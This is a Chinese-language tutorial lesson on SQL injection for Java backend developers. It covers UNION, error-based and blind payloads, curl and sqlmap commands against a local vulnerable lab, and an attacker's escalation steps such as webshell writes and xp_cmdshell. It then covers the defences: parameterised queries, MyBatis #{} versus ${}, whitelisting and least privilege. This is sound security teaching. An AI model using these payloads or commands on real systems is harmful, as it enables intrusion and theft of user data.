## 为什么要学

你写了 6 年 Java 后端，`SELECT * FROM orders WHERE id = ?` 这样的语句敲过成千上万遍。SQL 注入之所以是每个后端都必须先过的一关，是因为它的根因就藏在你每天写的代码里：把用户输入拼进 SQL 字符串。汽车、IoT、电商这些系统里，只要有一个搜索框、一个排序参数、一个后台报表拼错了，攻击者就能读走整张用户表、订单表，甚至通过数据库权限反向拿下服务器。

SQL 注入是理解“**数据被当成代码执行**”这一类漏洞的原型。XSS 是数据被当成 HTML/JS 执行，命令注入是数据被当成 shell 执行，模板注入是数据被当成表达式执行——它们的思路和防御哲学都和 SQL 注入一脉相承。先把这一课吃透，后面几课会轻松很多。

学完这一课，你应该能做到：

- 看到一段拼接 SQL 的 Java/MyBatis 代码，立刻判断它能不能被注入、从哪个参数注入。
- 手工构造联合查询、报错、布尔盲注、时间盲注四类 payload，并读懂返回。
- 说清楚 `PreparedStatement` 为什么能根治注入、又在哪些位置根治不了，以及 MyBatis `#{}` 和 `${}` 的本质区别。

> 本课的攻击 payload 只可用于你自己的 Lab（本机 `/vuln/l01`）或已获授权的目标，不要拿去打别人的系统。

## 核心概念

### 漏洞的根：拼接 SQL

看 Lab 01 漏洞版的核心代码（`VulnNoteSearchController`）：

```java
String sql = "SELECT id, owner_id, title, content FROM notes"
        + " WHERE owner_id = " + userId
        + " AND title LIKE '%" + keyword + "%'";
return jdbc.query(sql, new DataClassRowMapper<>(Note.class));
```

`keyword` 是用户可控的请求参数，直接被拼进了 SQL 文本。当你搜 `todo` 时，最终 SQL 是：

```sql
SELECT id, owner_id, title, content FROM notes WHERE owner_id = 1 AND title LIKE '%todo%'
```

但 `keyword` 里如果包含一个单引号，就能提前“闭合”那个字符串字面量，后面的内容数据库会当成 SQL 语法来解析。这就是注入的全部秘密：**用户数据越过了“数据”边界，变成了“代码”**。数据库拿到的是一串已经拼好的文本，它无从知道哪部分是程序员写的、哪部分是用户填的。

### 联合查询注入（UNION-based）

当查询结果会直接回显给你时，`UNION SELECT` 是最直接的拿数据方式。它把你自己构造的一条查询“接”到原查询后面，让两条结果一起返回。前提是两条 SELECT 的**列数相同、类型兼容**。

Lab 里 notes 表回显 4 列（id, owner_id, title, content），所以要拖 users 表就得也凑 4 列：

```sql
' UNION SELECT id, id, username, password FROM users --
```

`--` 是 SQL 行注释，把原语句剩下的 `%'` 之类的尾巴注释掉。这样 title 列显示用户名、content 列显示密码，密码就跟着笔记一起回显出来了。

### 报错注入（error-based）

如果结果不回显、但错误信息会显示给你，就可以把想要的数据塞进一个会报错的函数里，让数据库把它写进错误消息。不同数据库手法不同（如 MySQL 早期常用 `extractvalue`/`updatexml`，会把子查询结果拼进 XPath 语法错误里）。核心思路是：**用一条注定失败的语句，把数据从错误信息这个“侧信道”漏出来**。生产系统把详细报错返回给前端，本身就是信息泄露。

### 布尔盲注（boolean-based blind）

如果既不回显数据、也不回显错误，只能看到“成功/失败”“有结果/无结果”这种两种状态，就用布尔盲注：构造一个条件表达式，通过页面反应的差异一位一位地猜数据。

```sql
' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S' --
```

如果这条让页面“有结果”，说明 admin 密码第一个字符是 `S`；否则换一个字母试。配合二分法，一个字符最多几次就能定位。慢但可靠，通常写脚本自动跑。

### 时间盲注（time-based blind）

连“成功/失败”都看不出差别时，用时间做侧信道：让数据库在条件成立时“睡”几秒，通过响应时间判断真假。

```sql
'; SELECT CASE WHEN (条件) THEN pg_sleep(3) ELSE pg_sleep(0) END --
```

（MySQL 用 `SLEEP()`，SQL Server 用 `WAITFOR DELAY`，写法随库而异。）响应慢了 3 秒 = 条件成立。这是最“万能”但也最慢的一类。四类注入的选择顺序通常是：能回显就 UNION，不回显看报错，都不行退到布尔盲注，最后才用时间盲注。

### 预编译（PreparedStatement）为什么能根治

看 Lab 01 修复版（`SecureNoteSearchController`）：

```java
String sql = "SELECT id, owner_id, title, content FROM notes"
        + " WHERE owner_id = ? AND title LIKE ? ESCAPE '\\'";
return jdbc.query(sql, new DataClassRowMapper<>(Note.class), userId, "%" + escaped + "%");
```

关键在于：带 `?` 占位符的 SQL 会**先被数据库编译成执行计划**（parse + plan），此时语句的结构已经定死了；之后传入的参数值只作为“数据”填进这些占位符，**永远不会再被当成 SQL 语法解析**。所以哪怕参数里全是单引号、`UNION`、`--`，数据库也只会把它当成一个普通的字符串去和 title 比较，注入无从谈起。

这和“过滤单引号”有本质区别：过滤是黑名单思路，你永远列不全所有危险字符和编码变体；而预编译是从机制上把数据和代码分成了两条通道，根本不给数据变成代码的机会。这也是为什么答案永远是“参数化查询”而不是“转义/过滤输入”。

注意：`JdbcTemplate` 的 `jdbc.query(sql, mapper, args...)` 底层用的就是 `PreparedStatement`，`args` 就是绑定参数。反例是 `jdbc.query("... " + keyword)` 这种把值拼进 sql 字符串——那即使用了 JdbcTemplate 也照样能注入。工具本身不防注入，**用没用参数绑定**才是关键。

### 占位符挡不住哪些位置

`?` 只能绑定“值”（value），不能绑定 SQL 的“结构”部分。以下位置数据库语法上不允许用占位符：

- 表名、列名：`SELECT * FROM ?` 非法。
- `ORDER BY` 后面的列名和 `ASC/DESC`。
- `LIMIT` 在部分数据库/驱动上、以及 `IN (...)` 的动态列数，需要特殊处理。

这些位置如果由用户控制（比如前端传 `sortBy=price`、`order=desc`），又不能用占位符，就只能用**白名单**：

```java
// 只允许固定的几个排序字段，绝不把用户输入拼进 SQL
private static final Map<String, String> SORT_COLUMNS = Map.of(
        "price", "price", "created", "created_at", "name", "name");

String column = SORT_COLUMNS.get(sortBy);       // 用户传的 key -> 受控的真实列名
if (column == null) column = "created_at";       // 默认值，非法输入直接落到默认
String direction = "desc".equalsIgnoreCase(order) ? "DESC" : "ASC";
String sql = "SELECT ... ORDER BY " + column + " " + direction;
```

白名单的精髓是：拼进 SQL 的字符串**来自你自己定义的常量集合**，用户输入只用来“选择”，不直接“提供”内容。

### MyBatis：#{} vs ${}

这是 Java 后端最容易踩、也最该记牢的一条。

| 写法 | 生成的 SQL | 本质 | 能否防注入 |
|---|---|---|---|
| `#{keyword}` | `... LIKE ?`，值走绑定参数 | PreparedStatement 占位符 | 能，默认就用它 |
| `${keyword}` | 直接把值拼进 SQL 文本 | 字符串替换（拼接） | **不能，等于手动拼 SQL** |

例子：

```xml
<!-- 安全：编译成 title LIKE ? -->
<select id="search">SELECT * FROM notes WHERE title LIKE CONCAT('%', #{kw}, '%')</select>

<!-- 危险：kw 直接进 SQL 文本，可注入 -->
<select id="bad">SELECT * FROM notes WHERE title LIKE '%${kw}%'</select>
```

原则：**默认永远用 `#{}`**。`${}` 只在“确实需要动态 SQL 结构”（表名、ORDER BY 列名）时才用，而且此时**必须**配合白名单校验，绝不能直接放用户输入。JPA 同理：`@Query` 里用命名参数/位置参数是安全的，而拼 `createNativeQuery("... " + input)` 的原生查询和字符串拼接一样危险。回看你过去的项目，全局搜索 `${` 和字符串 `+` 拼 SQL，是最快的自查方式。

### LIKE 通配符转义与二次注入

即使用了参数绑定，`LIKE` 还有一个小坑：`%` 和 `_` 是 LIKE 的通配符。用户搜一个 `%`，绑定后 SQL 是 `LIKE '%%%'`，会匹配所有行——这不是注入，但可能被滥用来绕过“只搜自己数据”的意图或做 DoS。所以修复版额外做了转义：

```java
String escaped = keyword.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_");
// 配合 SQL 里的 ESCAPE '\'，让 % _ 只按字面匹配
```

**二次注入（second-order）**：数据第一次写入时是安全的（参数化存进库），但之后从库里取出来，又被拼进另一条 SQL 时发生注入。比如注册时用户名 `admin'--` 被安全存入，后台某处 `"... WHERE name = '" + nameFromDb + "'"` 又拼了它。防御同样是：**任何时候把值放进 SQL 都用参数绑定，不管这个值来自请求还是来自数据库**。“可信的来源”是个陷阱——数据库里的数据一样可能是攻击者早先埋进去的。

## 动手实践

### 实践 1：完成 Lab 01

先启动应用（Lab 需要 JDK 17+）：

```bash
export JAVA_HOME=$(/usr/libexec/java_home -v 17)
./mvnw spring-boot:run     # 监听 127.0.0.1:8080
```

预置数据：alice(id=1)、bob(2)、admin(3)；notes 表里 id=4 是 admin 的 `admin secrets`，内容是 `prod db password: hunter2`。当前用户用请求头 `X-User-Id` 模拟。

**第一步，正常搜索**，确认接口行为：

```bash
curl -H 'X-User-Id: 1' 'localhost:8080/vuln/l01/notes/search?keyword=todo'
```

期望输出（alice 只看到自己的一条）：

```json
[{"id":2,"ownerId":1,"title":"alice todo","content":"learn TCP/IP"}]
```

怎么读：`WHERE owner_id = 1 AND title LIKE '%todo%'` 命中一条。这是“正常”基线，后面对比用。

**第二步，`OR 1=1` 逃逸 owner 限制**。用 `--data-urlencode` 让 curl 帮你 URL 编码，避免手动转义：

```bash
curl -G -H 'X-User-Id: 1' 'localhost:8080/vuln/l01/notes/search' \
  --data-urlencode "keyword=' OR 1=1 --"
```

拼接后的实际 SQL 是：

```sql
SELECT id, owner_id, title, content FROM notes WHERE owner_id = 1 AND title LIKE '%' OR 1=1 --%'
```

怎么读：`OR 1=1` 让 WHERE 恒真，`owner_id = 1` 的限制被架空，`--` 注释掉尾巴。返回里会出现 `bob diary`、`admin secrets` 等**别人的笔记**——水平越权在这里是注入的副产品。

**第三步，UNION 拖出密码**：

```bash
curl -G -H 'X-User-Id: 1' 'localhost:8080/vuln/l01/notes/search' \
  --data-urlencode "keyword=' UNION SELECT id, id, username, password FROM users --"
```

期望输出：前面是 alice 自己的两条笔记（`LIKE '%'` 匹配全部标题），后面接上了 users 表的三行（行的顺序可能不同，示意如下）：

```json
[{"id":1,"ownerId":1,"title":"alice shopping","content":"milk, eggs"},
 {"id":2,"ownerId":1,"title":"alice todo","content":"learn TCP/IP"},
 {"id":1,"ownerId":1,"title":"alice","content":"alice123"},
 {"id":2,"ownerId":2,"title":"bob","content":"bob123"},
 {"id":3,"ownerId":3,"title":"admin","content":"S3cret!"}]
```

怎么读：`content` 字段现在装的是 users 表的 `password`。列数（4）和位置对上了，users 表的数据就借 notes 的查询通道流了出来。这正是测试 `unionDumpsPasswordsOnVuln` 断言的 `hasItem("S3cret!")`。

**第四步，对比安全接口**，同样三个 payload 打 `/secure/l01`：

```bash
curl -G -H 'X-User-Id: 1' 'localhost:8080/secure/l01/notes/search' \
  --data-urlencode "keyword=' OR 1=1 --"
```

期望输出：

```json
[]
```

怎么读：payload 被当成一个普通字符串去和 title 做 LIKE 比较，没有任何 title 长得像 `' OR 1=1 --`，所以返回空数组。注入彻底失效——这就是参数化的效果。

**第五步，跑测试**看攻防两端一起验证：

```bash
export JAVA_HOME=$(/usr/libexec/java_home -v 17)
./mvnw test -Dtest=SqlInjectionTests
```

期望结尾：

```
Tests run: 4, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS
```

怎么读：4 个用例覆盖“正常搜索、OR 注入、UNION 注入、LIKE 通配符字面化”，每个攻击都断言 vuln 被打穿、secure 挡住。绿了就说明修复到位。

### 实践 2：PortSwigger SQL injection（Apprentice）

到 PortSwigger Web Security Academy 的 SQL injection 分类做 Apprentice 级实验。典型两个：

- “retrieve hidden data”：商品分类页 URL 类似 `?category=Gifts`，注入 `?category=Gifts'--` 或 `?category=Gifts' OR 1=1--`，让 `WHERE category='Gifts' AND released=1` 的 `released=1` 被注释掉，未发布商品也显示出来。对照 Lab 里的 `OR 1=1`，思路完全一致。
- “login bypass”：用户名填 `administrator'--`，把密码校验那半句注释掉，直接以管理员登录。

怎么读结果：实验页顶部的横幅从 “Not solved” 变成绿色 “Solved” 即通过。做的时候刻意把每个 payload 拼进原 SQL 手写一遍，训练“看代码就知道注入点”的直觉。

## 攻击者视角

攻击者拿到一个接口，通常按这个节奏走：

1. **找注入点**：在每个参数后加一个 `'`，看是否报错或行为异常。
2. **判断类型**：能回显用 UNION；只回错误用报错注入；只有真假用布尔盲注；啥都没有用时间盲注。
3. **摸清结构**：`ORDER BY N` 试列数；`information_schema` 枚举库名、表名、列名。
4. **拖数据**：UNION 或盲注读 users、订单、密钥表。
5. **提权/落地**：借数据库权限读写文件、执行命令，或用拖到的口令横向移动。

几个实战要点，能帮你在防御时想到攻击者会怎么绕：

- **加单引号是最快的探针**。参数后一个 `'` 让页面报错或行为变化，往往就说明存在注入。攻击者也会试数字型注入（`id=1 AND 1=1` vs `id=1 AND 1=2`），数字型连引号都不需要。
- **`information_schema` 是数据库的“地图”**。`SELECT table_name FROM information_schema.tables`、`SELECT column_name FROM information_schema.columns WHERE table_name='users'`，攻击者靠它在不知道表结构的情况下枚举出一切。
- **自动化工具 sqlmap**。找到一个注入点后，`sqlmap -u '目标URL' --dump` 能自动判类型、枚举库表、批量拖数据。你可以在自己的 Lab 上跑一次感受威力：`sqlmap -u 'http://localhost:8080/vuln/l01/notes/search?keyword=x' --headers='X-User-Id: 1' --batch`。正因为工具如此成熟，一个残留的注入点几乎等于“数据全泄露”。
- **危害不止读数据**。视数据库和权限，注入还可能：写文件（MySQL `INTO OUTFILE` 写 webshell）、读文件（`LOAD_FILE`）、执行系统命令（SQL Server `xp_cmdshell`、PostgreSQL 扩展）、通过 DNS/HTTP 外带数据（OOB）。所以“这个接口只读、注入了也没关系”是危险的错觉。

## 防御与最佳实践

按优先级，从根治到纵深：

- **默认参数化查询**。所有把值放进 SQL 的地方，一律用占位符 + 绑定参数：`JdbcTemplate` 用 `?` + args，MyBatis 用 `#{}`，JPA 用命名参数。团队约定“禁止字符串拼 SQL”，并用静态扫描（如 SpotBugs/find-sec-bugs、SonarQube 的 SQL 注入规则）在 CI 里卡住。
- **动态结构用白名单**。表名、`ORDER BY` 列名、`ASC/DESC` 这些不能绑定的位置，只允许从你预定义的常量集合里取值，非法输入落到默认值。
- **LIKE 通配符转义**，配合 `ESCAPE`，防止 `%`/`_` 意外放大匹配范围。
- **数据库账号最小权限**。应用连库的账号只给它需要的库/表的增删改查，不给 FILE、不给 DDL、不给 `xp_cmdshell` 之类的危险权限。这挡不住“读走本应用能读的数据”（业务账号本来就能读 users 表），但能挡住“拖走其他库、写文件、执行命令”这类提权和横向。它是纵深防御，不是主防线。
- **关闭详细报错**。生产环境不要把数据库异常栈、SQL 语句返回给前端，掐断报错注入的侧信道。Spring 里用统一异常处理返回通用错误信息。
- **输入校验做兜底**。对参数做类型/长度/格式校验（比如 id 必须是数字、状态只能是枚举值）是好习惯，能缩小攻击面，但**它是补充，不是替代**——真正根治注入的永远是参数化。
- **WAF 做纵深**。云 WAF 能拦掉大量自动化扫描和常见 payload，但可被编码/分块绕过，只能当告警和减压层，不能当唯一防线。

一句话记忆链：**参数化根治 → 白名单管结构 → 最小权限 + 关报错兜底 → WAF/校验做纵深**。

## 常见误区

- **“我过滤了单引号，就安全了。”** 黑名单永远漏。数字型注入不需要引号；不同数据库有各种编码、注释、函数变体绕过过滤；宽字节注入还能用字符集吃掉转义符。唯一可靠的是参数化。
- **“用了 MyBatis / ORM 就自动防注入。”** 只有 `#{}` 是参数化的，`${}` 就是拼接。ORM 里只要你用了拼接式的原生 SQL（JPA 的 `createNativeQuery("..."+x)`、MyBatis 的 `${}`），照样能注入。框架不背这个锅。
- **“存储过程一定安全。”** 存储过程内部如果用动态 SQL（`EXEC('...'+@p)`）拼接参数，一样能注入。安不安全取决于里面有没有拼接，不取决于是不是存储过程。
- **“这个接口只读数据，注入了也无所谓。”** 只读也能拖走整库；配合数据库权限还能写文件、执行命令、外带数据。没有“无所谓”的注入。
- **“用了 PreparedStatement 就万无一失。”** 如果你把用户输入拼进了 SQL 字符串再交给 PreparedStatement（`prepareStatement("... "+x)`），占位符形同虚设。关键是**值有没有走绑定参数**，不是用没用这个类。
- **“ORDER BY 也能用 `?`。”** 不能。占位符只绑值，不绑结构。排序列名要用白名单。

## 自测

:::details 1. 为什么“过滤单引号”不是 SQL 注入的解决方案？
因为它是黑名单思路，而黑名单永远列不全。第一，数字型注入根本不需要单引号，`id=1 OR 1=1` 就能注入。第二，攻击者有大量绕过手段：各种编码（URL/Unicode/十六进制）、注释拆分关键字、宽字节注入用字符集吃掉转义符、不同数据库的方言变体。第三，就算你转义了引号，`ORDER BY` 这种拼接结构的位置照样能注。真正的解法是从机制上把“数据”和“代码”分成两条通道——参数化查询让用户输入永远只作为数据被填入已编译好的语句，根本没有机会变成 SQL 语法。
:::

:::details 2. PreparedStatement 为什么能根治注入？它挡不住哪些位置？
根治的原理：带 `?` 的 SQL 会先被数据库编译成执行计划，语句结构此时已固定；之后绑定的参数值只作为数据填入占位符，永远不会再被当成 SQL 语法解析。所以参数里无论有什么引号、UNION、注释，都只是一个普通字符串值。它挡不住的是“结构”位置——占位符只能绑值，不能绑表名、列名、`ORDER BY` 后的列名与排序方向、动态列数的 `IN`。这些位置若由用户控制，只能用白名单（从预定义常量集合里选），不能拼用户输入。
:::

:::details 3. MyBatis 的 #{} 和 ${} 有什么区别？各该在什么时候用？
`#{}` 生成 `?` 占位符，值走 PreparedStatement 绑定，安全，是默认选择。`${}` 是直接把值拼进 SQL 文本，等同手工字符串拼接，会导致注入。原则：默认永远用 `#{}`；`${}` 只在需要动态 SQL 结构（表名、`ORDER BY` 列名）时才用，且必须配合白名单校验，绝不能直接放用户输入。自查项目时全局搜 `${` 是最快的方式。
:::

:::details 4. 四类注入（UNION / 报错 / 布尔盲注 / 时间盲注）分别在什么场景用？
看你能拿到什么反馈。结果会回显 -> UNION 联合查询，最直接；不回显数据但回显错误 -> 报错注入，把数据塞进错误信息侧信道；既不回显数据也不回显错误，但能看出“有结果/无结果”“成功/失败”两种状态 -> 布尔盲注，一位一位猜；连真假都看不出来 -> 时间盲注，用 `SLEEP`/`pg_sleep` 让响应变慢来判断条件真假。选择顺序：UNION > 报错 > 布尔盲注 > 时间盲注，越靠后越慢但越通用。
:::

:::details 5. 数据库账号最小权限能挡住什么、挡不住什么？
挡不住：应用业务账号本来就有权限读的数据。比如注入让你读 users 表，而应用本来就要查 users 表登录，那这个权限本就存在，最小权限帮不了。挡得住：越出业务范围的提权动作——读其他库、写文件（`INTO OUTFILE` 写 webshell）、执行系统命令、DDL 改表结构。所以最小权限是纵深防御，能把“注入”的爆炸半径从“整台服务器”缩小到“本应用能碰的那部分数据”，但它不是主防线，主防线永远是参数化。
:::

:::details 6. 什么是二次注入（second-order）？为什么“数据来自数据库就可信”是错的？
二次注入指：数据第一次写入时是安全的（参数化存进库），但之后被从库里取出，又拼进另一条 SQL 时才触发注入。例如用户名 `admin'--` 安全存入，后台某处 `"WHERE name='"+nameFromDb+"'"` 又拼了它。教训是：数据库里的数据一样可能是攻击者早先埋下的，“可信来源”是陷阱。任何时候把值放进 SQL——不管它来自请求、数据库、缓存还是配置——都必须用参数绑定。
:::

:::details 7. 用了 JdbcTemplate / ORM 就自动安全吗？
不。工具本身不防注入，用没用参数绑定才是关键。`jdbc.query(sql, mapper, args)` 里 args 走绑定是安全的，但 `jdbc.query("..."+keyword)` 照样注入。MyBatis 的 `${}`、JPA 的 `createNativeQuery("..."+x)`、拼字符串的存储过程，全都能注入。判断标准只有一个：用户输入最终是作为“绑定参数”还是作为“SQL 文本的一部分”进入数据库。
:::

## 一句话总结

SQL 注入的本质是用户数据越界变成了 SQL 代码，唯一的根治办法是参数化查询（`#{}`、`?` 绑定）把数据和代码分成两条通道；占位符管不到的表名、`ORDER BY` 等结构位置用白名单，再叠加最小权限、关报错、输入校验做纵深防御。
